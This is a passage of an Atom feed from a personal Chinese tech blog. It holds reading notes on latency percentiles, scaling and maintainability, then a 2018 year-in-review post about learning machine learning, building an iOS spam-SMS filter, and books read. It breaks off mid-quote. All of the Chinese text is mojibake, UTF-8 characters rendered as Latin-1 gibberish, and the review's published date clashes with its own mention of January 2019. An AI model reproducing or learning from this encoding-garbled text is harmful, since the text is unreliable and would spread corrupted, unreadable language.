time</li><li>å»¶è¿Ÿï¼šè¯·æ±‚èŠ±è´¹åœ¨å¤„ç†ä¸Šçš„æ—¶é—´ã€‚</li></ul></li><li>ç™¾åˆ†ä½æ•°ï¼ˆPercentileï¼‰ï¼š<ul><li>å“åº”æ—¶é—´å¦‚æœç›´æ¥æ•°å­¦å¹³å‡ï¼Œæ— æ³•åæ˜ å¤§è‡´æœ‰å¤šå°‘è¯·æ±‚å—åˆ°å½±å“</li><li>p95, p99, p999è¡¨ç¤ºæœ‰95%, 99%, 99.9%çš„è¯·æ±‚çš„å“åº”æ—¶é—´å¿«äºæŸä¸ªå€¼ã€‚</li></ul></li><li>å°¾éƒ¨å»¶è¿Ÿï¼ˆtail latenciesï¼‰ï¼šå“åº”æ—¶é—´çš„é«˜ç™¾åˆ†ä½ç‚¹æœ‰æ—¶ä¹Ÿå¾ˆé‡è¦<ul><li>å¯¹äºAmazonï¼Œå¤§å®¢æˆ·è¯·æ±‚çš„æ•°æ®é‡å¤§ï¼Œå“åº”æ—¶é—´ä¹Ÿå°±æ›´é•¿ï¼Œä¸èƒ½ä¸å…³æ³¨ã€‚</li></ul></li><li>SLO/SLA: Service Level Objective/Agreements, ç”¨ç™¾åˆ†ä½æ•°æ¥åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦å¯ç”¨ã€‚</li><li>æµ‹è¯•æ—¶è´Ÿè½½ç”Ÿæˆç‹¬ç«‹äºå“åº”æ—¶é—´æ¥æŒç»­å‘é€è¯·æ±‚ï¼Œä¸èƒ½ç­‰åˆ°æ”¶åˆ°å“åº”æ‰è½°ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚</li></ul><h3><span id="ying-dui-fu-zai-zeng-jia-de-fang-fa">åº”å¯¹è´Ÿè½½å¢åŠ çš„æ–¹æ³•</span></h3><ul><li>çºµå‘æ‰©å±•ï¼ˆscaling upï¼‰ï¼ˆå‚ç›´æ‰©å±•ï¼ˆvertical scalingï¼‰ï¼Œè½¬å‘æ›´å¼ºå¤§çš„æœºå™¨ï¼‰</li><li>æ¨ªå‘æ‰©å±•ï¼ˆscaling outï¼‰ ï¼ˆæ°´å¹³æ‰©å±•ï¼ˆhorizontal scalingï¼‰ï¼Œå°†è´Ÿè½½åˆ†å¸ƒåˆ°å¤šå°å°æœºå™¨ä¸Šï¼‰</li></ul><h2><span id="ke-wei-hu-xing">å¯ç»´æŠ¤æ€§</span></h2><p>è½¯ä»¶å¼€å‘æœ¬èº«å¼€é”€å¹¶ä¸ç®—å¤§ï¼Œæ—¥åçš„ç»´æŠ¤å‡çº§éœ€è¦èŠ±è´¹æ›´å¤šã€‚</p><p>è½¯ä»¶ç³»ç»Ÿçš„ä¸‰ä¸ªè®¾è®¡åŸåˆ™ï¼š</p><ul><li><p>å¯è¿ç»´æ€§ï¼ˆOperabilityï¼‰</p><p>æ–¹ä¾¿è¿è¥å›¢é˜Ÿæ¥ä¿æŒç³»ç»Ÿå¹³ç¨³è¿è¡Œã€‚</p></li><li><p>ç®€å•æ€§ï¼ˆSimplicityï¼‰ç®€åŒ–ç³»ç»Ÿå¤æ‚æ€§ï¼Œä½¿æ–°å·¥ç¨‹å¸ˆèƒ½å¤Ÿè½»æ¾ç†è§£ç³»ç»Ÿã€‚æ³¨æ„è¿™ä¸ç”¨æˆ·ç•Œé¢çš„ç®€å•æ€§å¹¶ä¸ä¸€æ ·ã€‚</p></li><li><p>å¯æ¼”åŒ–æ€§ï¼ˆEvolvabilityï¼‰åç»­å·¥ç¨‹å¸ˆèƒ½å¤Ÿè½»æ¾åœ°å¯¹ç³»ç»Ÿè¿›è¡Œæ”¹è¿›ï¼Œäº•æ ¹æ®éœ€æ±‚å˜åŒ–å°†å…¶é€‚é…åˆ°éå…¸å‹åœºæ™¯ï¼Œä¹Ÿç§°ä¸ºå¯å»¶ä¼¸æ€§ã€æ˜“ä¿®æ”¹æ€§æˆ–å¯å¡‘æ€§ã€‚</p></li></ul><h3><span id="ke-yun-wei-xing">å¯è¿ç»´æ€§</span></h3><ul><li>è‰¯å¥½çš„ç›‘æ§</li><li>è‡ªåŠ¨åŒ–</li><li>é¿å…ä¾èµ–å•å°æœºå™¨</li><li>è‰¯å¥½çš„æ–‡æ¡£å’Œæ˜“äºç†è§£çš„æ“ä½œæ¨¡å‹</li><li>é»˜è®¤è¡Œä¸ºå’Œå¯è¦†ç›–</li><li>è‡ªæˆ‘ä¿®å¤</li><li>è¡Œä¸ºå¯é¢„æµ‹</li><li>å…¶ä»–<ul><li>é€‚å½“çš„æ—¥å¿—æ¥è·Ÿè¸ªå‡ºé—®é¢˜ï¼ˆç³»ç»Ÿæ•…éšœæˆ–æ€§èƒ½ä¸‹é™ï¼‰çš„æ ¹æº</li><li>ä¿è¯ç³»ç»Ÿèƒ½å‡çº§ï¼Œå°¤å…¶æ˜¯å®‰å…¨è¡¥ä¸</li><li>æ­£ç¡®çš„é…ç½®</li><li>å¼€å‘æ—¶éµå¾ªæœ€ä½³å®è·µ</li></ul></li></ul><h3><span id="jian-dan-xing">ç®€å•æ€§</span></h3><p>ä¿è¯ä»£ç ç®€æ´ï¼Œè®©æ–°åŠ å…¥çš„ç å†œä¹Ÿèƒ½ç†è§£ä»£ç ã€‚ä¸€ä¸ªå¾ˆæœ‰æ•ˆçš„æ–¹æ³•æ˜¯æŠ½è±¡ï¼Œç”¨é«˜çº§ç±»æ¥æè¿°ç»Ÿä¸€çš„è¡Œä¸ºã€‚</p><ul><li>é˜²æ­¢çŠ¶æ€ç©ºé—´çˆ†ç‚¸</li><li>è®©ç³»ç»Ÿä¸­çš„æ¨¡å—å°½é‡è§£è€¦ï¼Œå‡å°‘ä¾èµ–</li><li>ä¿è¯ä¸€è‡´çš„å‘½å</li><li>å‡å°‘çŸ­è§†çš„hacks</li></ul><h3><span id="ke-yan-hua-xing">å¯æ¼”åŒ–æ€§</span></h3><p>æ–¹ä¾¿åç»­é‡æ„ã€åŠ å…¥æ–°åŠŸèƒ½é‚£ä¸ªï¼Œä¸å‰é¢çš„ç®€å•æ€§æ¯æ¯ç›¸å…³ã€‚</p><ul><li>æ•æ·å·¥ä½œæ¨¡å¼æ¯”è¾ƒæ–¹ä¾¿æ”¹å˜</li><li>TDDï¼šæµ‹è¯•é©±åŠ¨å¼€å‘</li></ul><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/">https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      Hello World!
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>å¹´åº¦æ€»ç»“ - 2018å¹´å…¨å¹´å¤ç›˜</title>
    <link href="https://qiwihui.com/qiwihui-blog-43/"/>
    <id>https://qiwihui.com/qiwihui-blog-43/</id>
    <published>2018-03-11T17:51:13.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>2019å¹´ä¸€æœˆå·²ç»è¿‡åŠï¼Œæœ¬è¯¥åœ¨å¹´åº•åäºŒæœˆå®Œæˆçš„æ€»ç»“åˆåˆ°ç°åœ¨æ‰å¼€å§‹ç€ç¬”ã€‚2018å¹´å‘ç”Ÿäº†å¾ˆå¤šäº‹ï¼Œä»å¹´åˆæ¯”ç‰¹å¸å¤§æ¶¨è‡³æœ€é«˜åˆ°ç°åœ¨äº’è”ç½‘å¯’å†¬å·²è‡³ï¼Œä¸æ–­å˜åŒ–çš„æ˜¯ç¯å¢ƒï¼Œä¸å˜çš„æ˜¯æ¯å¹´ä¸€æ¬¡çš„å¹´ç»ˆæ€»ç»“ã€‚ï¼ˆè¯¯ï¼‰</p><span id="more"></span><h2><span id="ji-zhu">æŠ€æœ¯</span></h2><p>åšä¸ºä¸€ä¸ªç¨‹åºå‘˜ï¼Œåœ¨ä¿æŒè‡ªå·±æŠ€æœ¯æ°´å¹³åŒæ—¶ï¼Œåº”å½“ä¸æ–­åœ°å­¦ä¹ ï¼Œæ€»ç»“å’Œæ€è€ƒæ–°çš„æŠ€æœ¯ï¼Œæ‰èƒ½åœ¨è¿™ä¸ªè¡Œä¸šä¸è‡³äºè¢«æ·˜æ±°ã€‚äº’è”ç½‘å¯’å†¬æ¥ä¸´ä¹‹æ—¶ï¼Œå¯¹äºè¿˜ä¸èƒ½æŒæ¡å½¢å¼çš„æˆ‘ä¹Ÿåªèƒ½å…ˆå¢å¼ºè‡ªèº«èƒ½åŠ›ä»¥æœŸå‡å°‘è¿™ä¸ªå¯’å†¬å¸¦æ¥å½±å“ã€‚</p><h3><span id="ji-qi-xue-xi-he-shen-du-xue-xi">æœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ </span></h3><p>ä»2017å¹´å¹´åº•å¼€å§‹æ¶‰è¶³æœºå™¨å­¦ä¹ æ·±åº¦å­¦ä¹ ï¼Œå…ˆæ˜¯å­¦ä¹ ç„¶ååœ¨å·¥ä½œé¡¹ç›®ä¸­å®è·µï¼Œè‡³ä»Šä¸€å¹´æœ‰ä½™ã€‚æœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ ä»å´æ©è¾¾çš„<a href="https://www.coursera.org/learn/machine-learning">ã€Šæœºå™¨å­¦ä¹ ã€‹</a>å’Œ<a href="https://www.coursera.org/specializations/deep-learning">ã€Šæ·±åº¦å­¦ä¹ ã€‹</a>è¯¾ç¨‹å¼€å§‹ï¼Œå´æ©è¾¾çš„è¯¾ç¨‹ç®€æ´æ˜“æ‡‚ï¼Œé€»è¾‘æ¸…æ¥šï¼Œè™½ç„¶éƒ½æ˜¯è‹±æ–‡ï¼Œä½†ä¹Ÿæ²¡æœ‰å¤ªå¤§å…³ç³»ã€‚ä¸è¿‡è¿™ä¸¤ä¸ªè¯¾ç¨‹æ³¨é‡ç®—æ³•èƒ¡å®ç°ï¼Œç¼ºå°‘é¡¹ç›®ï¼Œå› æ­¤å¯ä»¥éœ€è¦ <a href="http://fast.ai">fast.ai</a> çš„<a href="https://course.fast.ai/ml.html">æœºå™¨å­¦ä¹ </a>å’Œ<a href="https://course.fast.ai/start.html">æ·±åº¦å­¦ä¹ è¯¾ç¨‹</a>æ¥å·©å›ºæŒæ¡ã€‚ä¸»è¦ä½¿ç”¨çš„æ¡†æ¶æ˜¯ <code>Scikit-learn</code>ï¼Œ<code>Keras</code> å’Œ <code>Tensorflow</code>ï¼Œè¿™ä¸‰ä¸ªæŒæ¡ä¸è¶³ã€‚ä¹‹ååœ¨å…¬å¸å®‰å…¨é¡¹ç›®ä¸­ä½¿ç”¨äº†ä¸€äº›åˆ†æå’Œç®—æ³•ï¼Œå¯¹äºæœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ çš„ç†è§£å’Œåº”ç”¨ä¹Ÿåªèƒ½è¯´æ˜¯çš®æ¯›ã€‚</p><h3><span id="python-he-go">Pythonå’ŒGo</span></h3><ul><li>Pythonè¯­æ³•å·©å›ºï¼›</li><li>Goè¯­è¨€ç†Ÿæ‚‰äº†åŸºæœ¬è¯­æ³•ï¼Œèƒ½é˜…è¯»ä»£ç ï¼Œä¼šç®€å•ç¼–å†™ï¼›</li><li>å…¥é—¨Rustã€‚</li></ul><h3><span id="ios-kai-fa">iOS å¼€å‘</span></h3><p>å¹´åˆï¼ˆ2017å¹´æœ«ï¼‰ç­”åº”ç»™æœ‹å‹çš„ç”µå½±æ¨èç½‘ç«™å†™ä¸€ä¸ª iOS Appï¼Œç»“æœæœ‹å‹çš„ç«™å€’é—­äº†ä¹Ÿè¿˜æ²¡æœ‰å¼€å§‹ã€‚ä¸‹å®šå†³å¿ƒèŠ±äº†ä¸€ä¸ªå¤šæœˆå­¦ä¹  ã€ŠBeginning iOS 11 Programming With Swift 4.1ã€‹å’Œç»ƒä¹ ï¼Œç„¶åå¼€å§‹åšä¸€ä¸ªåŸºäºæœºå™¨å­¦ä¹ çš„åƒåœ¾çŸ­ä¿¡è¿‡æ»¤App <a href="https://github.com/qiwihui/SMSFilters">SMSFilters</a>ï¼ŒåŠŸèƒ½æ¨¡ä»¿ç†ŠçŒ«åƒçŸ­ä¿¡ã€‚åˆšå¼€å§‹å°±æ˜¯ä¸€è¡Œä»£ç å†™ä¸€å¤©ï¼Œä¸€ä¸ªBugæ”¹ä¸€å‘¨ï¼Œè½¯ä»¶å¼€å‘è¿™ç§äº‹æƒ…å°±æ˜¯è¦ä¸æ–­å®è·µæ‰èƒ½å¯¹æ‰€å­¦çš„çŸ¥è¯†æŒæ¡ã€‚</p><p>SMSFilters ä½¿ç”¨ Jieba åˆ†è¯å¤„ç†çŸ­ä¿¡ï¼Œç„¶åç”¨è¯è¢‹æ¨¡å‹æå–ç‰¹å¾ï¼Œæœ€åç”¨ LinearSVC è®­ç»ƒï¼Œå†™ SMSFilters é‡åˆ°çš„ç¬¬ä¸€ä¸ªéš¾é¢˜å°±æ˜¯é›†æˆè°ƒç”¨ CppJiebaï¼Œæ²¡æœ‰ç»éªŒï¼Œåªèƒ½æŸ¥æ–‡æ¡£ï¼ŒæŸ¥StackOverflowï¼Œç»è¿‡ä¸¤å‘¨å°è¯•ï¼Œç»ˆäºè§£å†³ï¼Œè¿‡ç¨‹å¯ä»¥å‚è§ Demo é¡¹ç›® <a href="https://github.com/qiwihui/SwiftJiebaDemo">SwiftJiebaDemo</a> å’Œåšæ–‡<a href="https://blog.qiwihui.com/qiwihui-blog-45/">åœ¨iOS-Swifté¡¹ç›®ä¸­é›†æˆCppJiebaåˆ†è¯</a>ã€‚ç›®å‰é¡¹ç›®è¿›å±•è‡³ä½¿ç”¨æ¨¡å‹è¿›è¡Œåƒåœ¾çŸ­ä¿¡åˆ¤æ–­ã€‚</p><h3><span id="kai-yuan-he-she-qu">å¼€æºå’Œç¤¾åŒº</span></h3><p>9æœˆåº•è¯·å‡å»ä¸Šæµ·å‚åŠ äº†ä»Šå¹´çš„ Google ä¸­å›½å¼€å‘è€…å¤§ä¼šï¼ŒGoogle æ˜¯ä¸€å®¶ä¼Ÿå¤§å…¬å¸ï¼Œä¹Ÿæ˜¯ä¸€å®¶ä»¤äººå‘å¾€çš„å…¬å¸.ã€‚Google å¯¹äºæŠ€æœ¯çš„è¿½æ±‚ä¹Ÿæ˜¯æœ‰ç›®å…±ç¹çš„ã€‚è™½ç„¶ Google é‡è¿”ä¸­å›½è¿›ç¨‹ä¸€ç›´å¾ˆè‰°éš¾ï¼Œä½†ä¸å¦¨ç¢å…¶æŠ€æœ¯ä¼ æ’­ã€‚æ­¤æ¬¡å‚åŠ å¼€å‘è€…å¤§ä¼šè®©æˆ‘ä½“ä¼šæœ€æ·±çš„æ˜¯ Google å¯¹äºæŠ€æœ¯çš„è¿½æ±‚ï¼Œä»¥åŠç”¨æŠ€æœ¯æ”¹å˜ä¸–ç•Œçš„ç†æƒ³ã€‚Google åˆ†äº«çš„æŠ€æœ¯æ¶‰åŠ AIï¼ŒTensorflowï¼ŒAndroidï¼ŒFirebaseï¼ŒFlutter ä»¥åŠ AR/VR ç­‰ï¼Œåœ¨ç”¨æŠ€æœ¯æ”¹å˜ä¸–ç•Œã€‚</p><h3><span id="bo-ke-he-zi-xun">åšå®¢å’Œèµ„è®¯</span></h3><p>æ—¥å¸¸çš„å’¨è¯¢è·å–åŸºæœ¬é è‡ªè®¢é˜…çš„ RSSï¼Œä»¥åŠè‡ªå·±æ­å»ºçš„ RSSHub å’Œä½¿ç”¨ <a href="http://feed43.com">feed43.com</a> åšçš„ feedï¼Œä½†æ˜¯å¯¹äºå¾®ä¿¡å…¬ä¼—å·ï¼Œè‡ªä»å¾®å¹¿åœºåœæ­¢ä¹‹åï¼Œä¸€ç›´æ²¡æœ‰å¾ˆå¥½çš„è·å–å·¥å…·ã€‚å»å¹´çš„åšå®¢æ•°é‡æ›´æ–°å¾ˆå°‘ï¼Œè€Œä¸”è´¨é‡ä¹Ÿä¸é«˜ï¼Œéƒ½æ˜¯ä¸€äº› â€œHow toâ€ æ–‡ï¼Œä»¥åŠåªå†™äº†å¤§çº²çš„å‡ ç¯‡æ–‡ç« ã€‚</p><h3><span id="ren-wu-guan-li">ä»»åŠ¡ç®¡ç†</span></h3><p>9æœˆçœ‹åˆ° limboys ç”¨ Trello ç®¡ç†å’Œè®°å½•æ—¥å¸¸çš„ <a href="https://trello.com/b/0LQ3Dyjg/limboys-life">Board</a>ï¼Œå¾ˆæœ‰æ¡ç†ï¼Œä¾¿å¼€å§‹ä½¿ç”¨ Trello ç®¡ç†å’Œè®°å½•åŒ…æ‹¬çœ‹ä¹¦ï¼Œç”µå½±ç”µè§†ï¼Œä»¥åŠé¡¹ç›®ï¼Œç›®å‰å…¬å¼€äº†ä¸¤ä¸ª Boardï¼š<a href="https://trello.com/b/T4epspk2/qiwihuis-life">Qiwihuiâ€™s Life</a> å’Œ <a href="https://trello.com/b/fZ2i0xjA/%E6%8A%80%E6%9C%AF%E5%92%8C%E6%80%9D%E8%80%83">æŠ€æœ¯å’Œæ€è€ƒ</a>ã€‚Trello çš„ä½“éªŒè½»ä¾¿ï¼Œæ–¹ä¾¿æ¢³ç†ï¼Œæ˜¯è¿„ä»Šç”¨è¿‡çš„æœ€èˆ’æœçš„é¡¹ç›®ç®¡ç†å·¥å…·ã€‚</p><h3><span id="qi-ta">å…¶ä»–</span></h3><ol><li>Chromeæ‰©å±•ï¼šOcto Previewer</li></ol><p>Forkå¹¶ä¿®æ”¹äº†ä¸€ä¸ª Chrome æ‰©å±•ï¼š<a href="https://chrome.google.com/webstore/detail/octo-previewer/bcgmcibilpjbffkbloafpiekljnaacpo">Octo Previewer</a>ï¼Œç”¨æ¥å®æ—¶é¢„è§ˆ Github ä¸Šçš„ PRsï¼ŒIssuesï¼ŒGists çš„ Markdown è¯„è®ºã€‚</p><ol start="2"><li>åœ¨macOSä¸ŠåŸºäºdockeræ„å»ºé€æ˜ä»£ç†</li></ol><p>Trello <a href="https://trello.com/c/Qw446FEY">å¡ç‰‡</a> ä¸Šè®°å½•è¿™ä¸ªè¿‡ç¨‹ã€‚ç†è®ºä¸Šæ˜¯å¯è¡Œçš„ï¼Œåªæ˜¯åœ¨æœ‰äº›å·¥å…·ä¸Šå¡ä½äº†å‰è¿›çš„è·¯çº¿ã€‚</p><ol start="3"><li>hiwifi-ss é¡¹ç›®</li></ol><p>è¿™ä¸ªåŸºäºæè·¯ç”±çš„ç¿»å¢™é¡¹ç›®æ²¡æœ‰æŒç»­ç»´æŠ¤ï¼Œä¸€åˆ™è‡ªå·±å¯¹äº lua å’Œ å‰ç«¯ä¸ç†Ÿæ‚‰ï¼Œå¼€å‘èµ·æ¥å›°éš¾ï¼ŒäºŒåˆ™æˆ‘è‡ªå·±çš„æè·¯ç”±åœ¨æ¬å®¶ä¹‹åå°±æ²¡æœ‰äº†ï¼Œå†è€…æè·¯ç”±ä¼¼ä¹å¤§åŠ¿å·²å»ï¼Œæ‰€ä»¥è¿™ä¸ªé¡¹ç›®åŸºæœ¬ä¹Ÿå°±ä¸‰å››ä¸ªæœˆæ›´æ–°ä¸€æ¬¡ã€‚è¿™ä¸ªé¡¹ç›®ç»™æˆ‘å¸¦æ¥çš„æœ€å¤§æ„Ÿè§¦å°±æ˜¯ç»´æŠ¤å¼€æºé¡¹ç›®çœŸçš„ä¸å®¹æ˜“ã€‚å‰äº›å¤©çœ‹åˆ° kalasoo çš„æ–‡ç« <a href="https://juejin.im/post/5c21a3ea5188254eaa5c4486">ã€Šå¼€æºå³è´£ä»»ã€‹</a>ä¹Ÿæ˜¯æœ‰æ„Ÿè§¦ã€‚</p><h2><span id="du-shu">è¯»ä¹¦</span></h2><p>2018å¹´ä¸ŠåŠå¹´å¿™ä¸æœºå™¨å­¦ä¹ å’Œé¡¹ç›®ï¼Œå‡ ä¹æ²¡æœ‰è¯»ä»€ä¹ˆä¹¦ï¼Œä¸‹åŠå¹´ï¼ˆ9æœˆï¼‰å¼€å§‹å…¥å‘ç§‘å¹»å°è¯´ã€‚ã€Šä¸‰ä½“ã€‹æ˜¯ä¸€éƒ¨å¥½çš„ç§‘å¹»å°è¯´ï¼Œä½†åœ¨å›½å†…ã€Šä¸‰ä½“ã€‹é€ å°±çš„ä¼ªç§‘å¹»è¿·ç¾¤ä½“ä»¥åŠéšä¹‹è€Œæ¥çš„å„ç§å„ç§è§†ä¸ºçœŸç†çš„æ¦‚å¿µç€å®ä»¤äººéš¾å—ï¼Œäºæ˜¯å…¥å‘ç§‘å¹»æ´—æ´—è„‘ã€‚ç§‘å¹»ç±»åŸºæœ¬éƒ½æ˜¯åç¯‡ï¼Œçœ‹è¿‡ä¹‹åï¼Œå¯¹äºã€Šä¸‰ä½“ã€‹æ‰€å¸¦æ¥çš„éœ‡æ’¼å‡è½»äº†ä¸å°‘ï¼Œä½†æ˜¯æˆ‘æ›´åŠ ä½©æœå¤§åˆ˜äº†ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51372377-09ea9d80-1b38-11e9-921e-d59c4be63552.png" alt="books"></p><h3><span id="ji-zhu-lei">æŠ€æœ¯ç±»</span></h3><ul><li><strong>ã€ŠNodeå…¥é—¨ã€‹</strong>ï¼šä¸€æœ¬å…¥é—¨ node çš„ä¸é”™çš„ç®€å•<a href="https://www.nodebeginner.org/index-zh-cn.html">æ•™ç¨‹</a>ã€‚</li><li><strong>ã€ŠBeginning iOS 11 Programming With Swift 4.1ã€‹</strong>ï¼šå‡ºè‡ª Appcoda çš„ iOS å¼€å‘å…¥é—¨æ•™ç¨‹ï¼Œå¯¾åˆå­¦è€…ååˆ†å‹å¥½ï¼Œè¯¦ç»†ä»‹ç»äº†å¼€å‘ä¸€ä¸ª App æ‰€éœ€è¦çš„å„ä¸ªç»†èŠ‚ã€‚</li><li><a href="https://legacy.gitbook.com/book/qiwihui/python-data-structure-cn/details">ã€Špython-data-structure-cnã€‹</a>ï¼šPythonæ•°æ®ç»“æ„ç®€å•ä»‹ç»å’Œå®è·µï¼Œä¸»è¦è¾¹å¸®ç€æ ¡å¯¹è¾¹è¯»äº†ã€‚</li><li><a href="https://legacy.gitbook.com/book/qiwihui/sketch-tutorial-for-ios-developers">ã€Šç»™iOSå¼€å‘è€…çš„Sketchå…¥é—¨æ•™ç¨‹ã€‹</a>ï¼šåšå›¾æ ‡ã€‚</li></ul><h3><span id="ke-huan-lei">ç§‘å¹»ç±»</span></h3><ul><li><strong>ã€Šæµ·ä¼¯åˆ©å®‰ã€‹åŠã€Šæµ·ä¼¯åˆ©å®‰çš„é™¨è½ã€‹</strong>ï¼Œä¸¹Â·è¥¿è’™æ–¯ï¼šå¤ªç©ºæ­Œå‰§ï¼Œæ„Ÿå¹äºä½œè€…å¯¹ä¸ƒä¸ªæœåœ£è€…æ•…äº‹çš„ç²¾å½©è®²è¿°ï¼Œä»¥åŠæŒ–å‘ã€‚</li><li><strong>ã€Šè½¯ä»¶ä½“çš„ç”Ÿå‘½å‘¨æœŸã€‹</strong>ï¼Œå§œå³¯æ¥ ï¼šä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯è®¡ç®—æœºçš„ä¹¦ï¼Œå§œå³¯æ¥ çš„ä¸­çŸ­ç¯‡éå¸¸æœ‰æ–™ï¼Œå’Œä¹‹å‰çœ‹è¿‡çš„ã€Šä½ ä¸€ç”Ÿçš„æ•…äº‹ã€‹çŸ­ç¯‡é›†åŒæ ·ç²¾å½©ã€‚</li><li>ã€Šé“¶æ²³å¸å›½ã€‹åŸºåœ°ä¸‰éƒ¨æ›²ï¼ŒåŒ…æ‹¬ <strong>ã€ŠåŸºåœ°ã€‹</strong>ã€<strong>ã€ŠåŸºåœ°ä¸å¸å›½ã€‹</strong>ã€<strong>ã€Šç¬¬äºŒåŸºåœ°ã€‹</strong>ï¼Œè‰¾è¨å…‹Â·é˜¿è¥¿è«å¤«ï¼šç»å…¸ä¸­ç»å…¸ã€‚</li><li>ã€Šé“¶æ²³å¸å›½ã€‹æœºå™¨äººç³»åˆ—ï¼ŒåŒ…æ‹¬ <strong>ã€Šæˆ‘ï¼Œæœºå™¨äººã€‹</strong>ã€ã€Šé’¢ç©´ã€‹ã€ã€Šè£¸é˜³ã€‹ã€ã€Šæ›™å…‰ä¸­çš„æœºå™¨äººã€‹ã€ã€Šæœºå™¨äººä¸å¸å›½ã€‹ï¼Œè‰¾è¨å…‹Â·é˜¿è¥¿è«å¤«ï¼šå¯¹äºæœºå™¨äººä¸‰å¤§æ³•åˆ™ï¼Œä½œè€…ä¸€æ­¥æ­¥è¿›è¡Œâ€œæ¨ç¿»â€è¡¥å……çš„è¿‡ç¨‹ã€‚</li><li>ã€Šå¹³é¢å›½â€”â€”åŠæ­£æ–¹å½¢çš„å¤šç»´ä¸–ç•Œå†é™©è®°ã€‹ï¼ŒåŸƒå¾·æ¸©Â·AÂ·è‰¾å‹ƒç‰¹ï¼šä½ å¦‚ä½•çœ‹å¾…äºŒç»´ä¸–ç•Œï¼Œä»¥åŠå››ç»´ä¸–ç•Œå¦‚ä½•çœ‹ä½ ã€‚</li><li>ã€Šç«¥å¹´çš„ç»ˆç»“ã€‹ï¼Œé˜¿ç‘ŸÂ·å…‹æ‹‰å…‹ï¼šâ€œå¤§è§„æ‘¸å…»çŒªåœºæŠ€æœ¯â€ï¼ŒåŒ…æ‹¬å®‰æŠšï¼Œæ¨èã€‚</li><li><strong>ã€Šä¸æ‹‰ç›ç›¸ä¼šã€‹</strong>ï¼Œé˜¿ç‘ŸÂ·å…‹æ‹‰å…‹ï¼šå°è¯´å¯¹äº Rama é£èˆ¹çš„æ¢ç´¢å†™çš„å¾ˆè¯¦å°½ï¼Œä»¥è‡³äºæœ€åç¦»å¼€é£èˆ¹åé£èˆ¹çš„è¡ŒåŠ¨è®©æˆ‘å¤§æ°”ä¸æ•¢å‡ºã€‚</li></ul><h3><span id="shu-xue-lei">æ•°å­¦ç±»</span></h3><ul><li>ã€Šä»ä¸€åˆ°æ— ç©·å¤§ï¼šç§‘å­¦ä¸­çš„äº‹å®å’Œè‡†æµ‹ã€‹ï¼šç§‘æ™®ï¼Œè®²çš„ä¸œè¥¿å¾ˆå¤šï¼Œç¬¬ä¸€ç« æ˜¯æ•°è®ºï¼Œç¬¬äºŒç« æ˜¯ç›¸å¯¹è®ºï¼Œç¬¬ä¸‰ç« æ˜¯å¾®è§‚ä¸–ç•Œï¼Œç¬¬å››ç« æ˜¯å®è§‚ä¸–ç•Œï¼Œå¯¹äºæˆ‘æ— å¤ªå¤šæ„Ÿæƒ³ï¼Œå¿…ç«Ÿå¾ˆå¤šéƒ½çŸ¥é“äº†ï¼Œæ„Ÿè§‰åˆçœ‹äº†ä¸€éé«˜ä¸­ä¹¦ã€‚</li><li><strong>ã€Šç´ æ•°ä¹‹æ‹â€”é»æ›¼å’Œæ•°å­¦ä¸­æœ€å¤§çš„æœªè§£ä¹‹è¿·ã€‹</strong>ï¼šç†è®ºå’Œè®¡ç®—ç»“åˆã€‚</li><li><strong>ã€ŠRiemann çŒœæƒ³æ¼«è°ˆã€‹</strong>ï¼šé€šä¿—æ˜“æ‡‚ã€‚</li></ul><p>å…³äºç´ æ•°çš„ä¸¤æœ¬ä¹¦ï¼Œä¸»è¦æ˜¯å› ä¸ºè²å°”å…¹å¥–ä¸é˜¿è´å°”å¥–åŒæ–™å¾—ä¸»è¿ˆå…‹å°”Â·é˜¿è’‚äºšçˆµå£«è®²è¿°ä»–å¯¹é»æ›¼çŒœæƒ³çš„è¯æ˜ï¼Œè¿™æ¬¡äº‹ä»¶é—´å¼•èµ·äº†æˆ‘è¯¦ç»†äº†è§£é»æ›¼çŒœæƒ³çš„å…´è¶£ï¼Œä¸ºæ­¤è¿˜ä¸“é—¨è´­ä¹°äº†ç»å…¸æ•™æ<a href="https://book.douban.com/subject/1707161/">ã€Šå¤å˜å‡½æ•°è®ºæ–¹æ³•ã€‹</a>ï¼ŒæœŸå¾…è¿›ä¸€æ­¥äº†è§£ã€‚è¿™ä¸¤æœ¬ä¹¦é€‚åˆä¸€èµ·çœ‹ï¼Œäº’ç›¸è¡¥å……ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿ˆå…‹å°”Â·é˜¿è’‚äºšçˆµå£«ï¼Œäº 2019 å¹´ 1 æœˆ 11 æ—¥ä¸Šåˆé€ä¸–ï¼Œäº«å¹´å…«åä¹å²ã€‚ä»–æœ€åçš„å°è¯•ï¼Œä»¤äººä½©æœï¼</p><blockquote><p>ã€Œæˆ‘ä¸€ç›´åœ¨å°è¯•ç†è§£äº‹ç‰©è¿è¡Œçš„åŸå› ã€‚æˆ‘å¯¹ä¸èƒ½ç†è§£èƒŒååŸç†çš„å…¬å¼ä¸æ„Ÿå…´è¶£ã€‚æˆ‘æ€»æ˜¯è¯•å›¾æŒ–æ˜äº‹ç‰©èƒŒåçš„åŸç†ï¼Œæ‰€ä»¥å¦‚æœæˆ‘æœ‰ä¸€ä¸ªå…¬å¼ï¼Œæˆ‘å°±ä¼šå»ç†è§£å®ƒä¸ºä»€ä¹ˆæ˜¯è¿™æ ·ã€‚ç†è§£æ˜¯ä¸€ä¸ªéå¸¸å›°éš¾çš„æ¦‚å¿µã€‚äººä»¬è®¤ä¸ºæ•°å­¦çš„å¼€å§‹æ˜¯ä½ 